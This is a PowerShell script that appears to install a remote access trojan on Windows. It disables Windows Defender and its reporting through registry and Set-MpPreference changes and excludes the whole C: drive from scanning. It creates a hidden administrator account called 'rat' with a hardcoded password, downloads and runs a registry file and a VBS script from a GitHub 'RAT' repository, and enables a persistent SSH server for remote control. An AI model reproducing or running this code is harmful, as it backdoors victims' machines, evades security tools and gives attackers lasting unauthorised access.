# Created by : Luke O'Sullivan

#Random string for directorys





try {
    Get-Service WinDefend | Stop-Service -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -value 4 -Type DWORD -Force
} 
catch {
    Write-Warning "Failed to disable WinDefend service"
}

try {
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
    if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {
        Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
        Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null
        Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableIntrusionPreventionSystem $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
        Set-MpPreference -DisableCScriptScanning $true -Force -ea 0 | Out-Null
        Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
        Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
        Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
        Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
        Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null

    }
} 
catch {
  Write-Warning "Failed to Disabled Defender"
}









function random_text{
    
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})

}
# create's local admin
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password $Password -FullName "$NewLocalAdmin" -Description "Temporary local admin"
        Write-Verbose "$NewLocalAdmin local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin added to the local administrator group"

    }
    end {
    }
}
#create admin user
$NewLocalAdmin = "rat"
$Password = (ConvertTo-SecureString "Rat123" -AsPlainText -Force)
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

#goto temp and make working directory
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location


mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"

#visual bacic script to registor the registory
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/calty.vbs -OutFile "calty.vbs"


##install the registry
./"wrev.reg"; ./"calty.vbs"

#Hide the Rat user in \Users
cd C:\Users
attrib +h +s +r rat


#cd $env:temp
#$directory_name = random_text
#mkdir $directory_name

## Variables
#$wd = random_text


#$path = "$env:temp/$wd"
#$initial_dir = Get-Location


#enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# 



# self delete
#cd $initial_dir
#del Installer.ps1